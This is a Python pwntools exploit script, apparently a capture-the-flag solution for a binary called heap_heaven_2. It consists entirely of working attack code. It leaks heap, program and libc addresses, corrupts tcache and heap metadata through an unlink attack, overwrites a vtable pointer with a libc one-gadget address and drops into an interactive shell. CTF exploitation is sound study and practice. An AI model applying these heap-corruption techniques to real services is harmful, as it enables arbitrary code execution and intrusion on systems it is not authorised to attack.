#!/usr/bin/env python # encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './heap_heaven_2'
TARGET = ('127.0.0.1', 2333)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def w(offset, data):
    r.sendlineafter('exit\n', '1')
    r.sendlineafter('How much do you want to write?\n', str(len(data)))
    r.sendlineafter('At which offset?\n', str(offset))
    r.send(data)

def f(offset):
    r.sendlineafter('exit\n', '3')
    r.sendlineafter('At which offset do you want to free?\n', str(offset))

def l(offset):
    r.sendlineafter('exit\n', '4')
    r.sendlineafter('At which offset do you want to leak?\n', str(offset))
    return r.recvline()[:-1]

code = ELF(BINARY)
libc = ELF(LIBC64)

# fill the tcache
w(0x1008, p64(0x101))
for i in xrange(7):
    f(0x1010)

w(0x1108, p64(0x21))
w(0x1128, p64(0x21))
f(0x1010)

#attach(0x15ff)
#attach(0x1664)

# leak heap base
heap_base = u64(l(0x1010).ljust(8, '\x00')) - 0x290
log.info('heap base = %#x' % heap_base)

# leak code base
w(0x1010, p64(heap_base + 0x280))
code.address = u64(l(0x1010).ljust(8, '\x00')) - 0x1670
log.info('code base = %#x' % code.address)

# leak self mmap
w(0x1010, p64(heap_base + 0xc0))
self_mmap = u64(l(0x1010).ljust(8, '\x00')) - 0x1010
log.info('self mmap = %#x' % self_mmap)

# leak libc base
w(0x1010, p64(code.got['puts']))
libc.address = u64(l(0x1010).ljust(8, '\x00')) - libc.sym['puts']
log.info('libc base = %#x' % libc.address)

# fix up
w(0x1010, p64(libc.address + 0x1e4ca0))

# unlink to edit mmaped to &mmaped-0x18
mmaped = code.address + 0x4048
w(0x8, p64(0x101))
w(0x10, p64(mmaped - 0x18) + p64(mmaped - 0x10))
w(0x100, p64(0x100)*2)
w(0x208, p64(0x21))
w(0x228, p64(0x21))
f(0x110)

# edit mmaped to heap base
w(0x18, p64(heap_base))

# edit vtable function
w(0x280, p64(libc.address + 0xe75f0))

# trigger
r.sendline('5')

r.interactive()
